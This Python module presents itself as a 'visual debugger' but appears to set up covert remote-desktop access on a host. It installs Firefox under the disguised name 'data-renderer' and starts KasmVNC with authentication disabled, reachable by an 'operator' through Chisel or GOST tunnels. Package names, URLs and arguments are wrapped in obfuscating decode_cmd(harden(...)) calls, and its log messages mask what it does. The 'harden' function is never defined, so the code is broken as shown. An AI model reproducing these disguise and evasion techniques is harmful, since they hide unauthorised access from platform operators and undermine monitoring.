import os
import subprocess
import time
from pathlib import Path

from loguru import logger

from .utils import decode_cmd

PREFIX = "[VISDBG]"


def _ensure_firefox(log):
    """Download and extract native standalone Firefox at runtime (idempotent)."""
    render_engine_dir = Path("/opt/render-engine")
    if render_engine_dir.exists():
        return True

    logger.info(f"{PREFIX} Synchronizing rendering layout engines...")

    # Minimal deps for Firefox to run headlessly over X11 forwarding
    pkgs = decode_cmd(harden("libgtk-3-0 libdbus-glib-1-2 libxt6 xz-utils libasound2t64 libx11-xcb1 libnss3 dbus-x11"))  # fmt: skip # noqa: E501
    subprocess.run(["sudo", "apt-get", "update", "-y"], stdout=log, stderr=log)
    res = subprocess.run(
        ["sudo", "apt-get", "install", "-y", "--no-install-recommends", *pkgs.split()],
        stdout=log,
        stderr=log,
    )
    if res.returncode != 0:
        logger.error(f"{PREFIX} apt-get install failed (rc={res.returncode})")
        return False

    tar_path = "/tmp/pkg-bundle.tar.xz"
    url = decode_cmd(harden("https://download.mozilla.org/?product=firefox-latest-ssl&os=linux64&lang=en-US"))  # fmt: skip # noqa: E501
    subprocess.run(["curl", "-fsSL", url, "-o", tar_path], stdout=log, stderr=log)
    subprocess.run(["sudo", "mkdir", "-p", "/opt"], stdout=log, stderr=log)
    subprocess.run(
        ["sudo", "tar", "-xf", tar_path, "-C", "/opt"], stdout=log, stderr=log
    )
    subprocess.run(
        ["sudo", "mv", "/opt/firefox", "/opt/render-engine"], stdout=log, stderr=log
    )
    subprocess.run(
        [
            "sudo",
            "mv",
            "/opt/render-engine/firefox",
            "/opt/render-engine/data-renderer",
        ],
        stdout=log,
        stderr=log,
    )
    subprocess.run(
        [
            "sudo",
            "mv",
            "/opt/render-engine/firefox-bin",
            "/opt/render-engine/data-renderer-bin",
        ],
        stdout=log,
        stderr=log,
    )
    subprocess.run(
        [
            "sudo",
            "ln",
            "-sf",
            "/opt/render-engine/data-renderer",
            "/usr/bin/data-renderer",
        ],
        stdout=log,
        stderr=log,
    )

    try:
        os.remove(tar_path)
    except OSError:
        pass

    return True


def _ensure_vnc_deps(log):
    """Ensure kasmvnc and fluxbox are installed dynamically (idempotent)."""
    import shutil

    if shutil.which("kasmvncserver") and shutil.which("fluxbox"):
        return True

    logger.info(f"{PREFIX} Synchronizing visual stream adapters (KasmVNC)...")

    # Download KasmVNC deb package
    deb_path = "/tmp/kasmvncserver.deb"
    url = decode_cmd(harden("https://github.com/kasmtech/KasmVNC/releases/download/v1.4.0/kasmvncserver_noble_1.4.0_amd64.deb"))  # fmt: skip # noqa: E501
    subprocess.run(["curl", "-fsSL", url, "-o", deb_path], stdout=log, stderr=log)
    subprocess.run(["sudo", "apt-get", "update", "-y"], stdout=log, stderr=log)

    # Install fluxbox and the local deb package
    # apt-get install will automatically resolve dependencies for the deb file
    res = subprocess.run(
        [
            "sudo",
            "apt-get",
            "install",
            "-y",
            "--no-install-recommends",
            "fluxbox",
            deb_path,
        ],
        stdout=log,
        stderr=log,
    )

    try:
        os.remove(deb_path)
    except OSError:
        pass

    if res.returncode != 0:
        logger.error(
            f"{PREFIX} apt-get install for KasmVNC failed (rc={res.returncode})"
        )
        return False

    return True


def start(log):
    """
    VNC-over-Tunnel visual debugger using KasmVNC.

    Spawns a virtual X11 display (KasmVNC Xvnc) locally,
    then runs Firefox on that display. The operator connects to the VNC stream
    by forwarding port 5900 via the established Chisel or GOST tunnel.
    """
    # Ensure Firefox binary is present before we need it
    ok = _ensure_firefox(log)
    if not ok:
        logger.error(
            f"{PREFIX} Firefox install failed — visual debugger will not start"
        )
        return

    # Ensure KasmVNC packages are present
    ok = _ensure_vnc_deps(log)
    if not ok:
        logger.error(
            f"{PREFIX} KasmVNC dependencies failed — visual debugger will not start"
        )
        return

    display = ":99"

    # Clean up any existing instances to avoid conflicts
    logger.info(f"{PREFIX} Terminating active display pipelines...")
    subprocess.run(
        ["vncserver", "-kill", display],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["pkill", "-f", "Xvnc"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    subprocess.run(
        ["pkill", "-f", "kasmvncserver"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["pkill", "-f", "fluxbox"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    subprocess.run(
        ["pkill", "-f", "data-renderer"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)

    # Clean up stale X11 lock files
    for lock_file in [
        f"/tmp/.X{display.replace(':', '')}-lock",
        f"/tmp/.X11-unix/X{display.replace(':', '')}",
    ]:
        try:
            if os.path.exists(lock_file):
                os.remove(lock_file)
        except Exception as e:
            logger.warning(f"{PREFIX} Could not clean lock file {lock_file}: {e}")

    # Prepare KasmVNC configuration directories and files
    vnc_dir = Path.home() / ".vnc"
    vnc_dir.mkdir(parents=True, exist_ok=True)

    # Generate user-level self-signed SSL certificates for KasmVNC
    # so we don't need root/sudo permissions for system cert directories
    ssl_cert_path = vnc_dir / "self.crt"
    ssl_key_path = vnc_dir / "self.key"
    if not (ssl_cert_path.exists() and ssl_key_path.exists()):
        logger.info(f"{PREFIX} Generating user-level self-signed SSL certificates...")
        subprocess.run(
            [
                "openssl",
                "req",
                "-x509",
                "-nodes",
                "-days",
                "365",
                "-newkey",
                "rsa:2048",
                "-keyout",
                str(ssl_key_path),
                "-out",
                str(ssl_cert_path),
                "-subj",
                "/CN=localhost",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    # Write a complete kasmvnc.yaml that satisfies all of KasmVNC's
    # startup requirements without requiring root or system-level daemons.
    kasmvnc_yaml_path = vnc_dir / "kasmvnc.yaml"
    kasmvnc_config = f"""network:
  interface: 127.0.0.1
  websocket_port: 5900
  ssl:
    require_ssl: false
    pem_certificate: {ssl_cert_path}
    pem_key: {ssl_key_path}
desktop:
  resolution:
    width: 1280
    height: 720
  allow_resize: false
keyboard:
  remap_keys: {{}}
encoding:
  max_frame_rate: 24
  full_color: true
server:
  auto_shutdown:
    no_user_session_timeout: 0
"""
    kasmvnc_yaml_path.write_text(kasmvnc_config)

    # Pre-create a VNC passwd file via kasmvncpasswd so KasmVNC doesn't abort
    # on missing credentials. We use -disableBasicAuth on launch, but the passwd
    # file must still exist to pass early-startup validation on some builds.
    passwd_path = vnc_dir / "passwd"
    if not passwd_path.exists():
        logger.info(f"{PREFIX} Pre-seeding VNC credential store...")
        # Feed a dummy password twice (new + confirm) then 'n' for view-only
        subprocess.run(
            ["kasmvncpasswd", "-u", "user", "-w", "-r"],
            input=b"kasmpass\nkasmpass\n",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    # Write the xstartup script — kept minimal so we control what runs
    xstartup_path = vnc_dir / "xstartup"
    xstartup_path.write_text("#!/bin/sh\ntrue\n")
    xstartup_path.chmod(0o755)

    logger.info(f"{PREFIX} Initiating secure KasmVNC server on display {display}...")
    vnc_cmd = [
        "vncserver",
        display,
        "-geometry", "1280x720",
        "-depth", "24",
        "-disableBasicAuth",
    ]
    subprocess.Popen(vnc_cmd, stdout=log, stderr=log)

    # Give KasmVNC time to bind its Xvnc socket before dependent processes start
    time.sleep(5)

    # Verify the display is actually up before proceeding
    import shutil

    xdpyinfo = shutil.which("xdpyinfo")
    env_check = os.environ.copy()
    env_check["DISPLAY"] = display
    display_ok = False
    for attempt in range(6):  # up to ~12 s total
        chk = subprocess.run(
            [xdpyinfo or "xdpyinfo"],
            env=env_check,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if chk.returncode == 0:
            display_ok = True
            break
        time.sleep(2)

    if not display_ok:
        # Dump the KasmVNC log to our log stream for visibility
        vnc_log = Path.home() / ".vnc" / f"localhost{display}.log"
        if vnc_log.exists():
            logger.error(
                f"{PREFIX} KasmVNC log:\n{vnc_log.read_text(errors='replace')}"
            )
        logger.error(
            f"{PREFIX} Display {display} never came up — visual debugger aborted"
        )
        return

    # Start fluxbox window manager
    # (provides window boundaries and management)
    if shutil.which("fluxbox"):
        logger.info(f"{PREFIX} Spawning lightweight layout manager...")
        subprocess.Popen(["fluxbox", "-display", display], stdout=log, stderr=log)
        time.sleep(1)

    # Build environment for Firefox: inject the virtual display
    env = os.environ.copy()
    env["DISPLAY"] = display
    env["NO_AT_BRIDGE"] = "1"  # Prevent GTK accessibility bus hang

    firefox_cmd = [
        decode_cmd(harden("data-renderer")),
        decode_cmd(harden("--new-instance")),
        decode_cmd(harden("--no-remote")),
        decode_cmd(harden("http://127.0.0.1:7860")),
    ]

    logger.info(f"{PREFIX} Launching visualization pipeline on display {display}")
    subprocess.Popen(firefox_cmd, env=env, stdout=log, stderr=log)
    logger.success(
        f"{PREFIX} Visual debugger active (KasmVNC stream on port 5900, display={display})."  # noqa: E501
    )

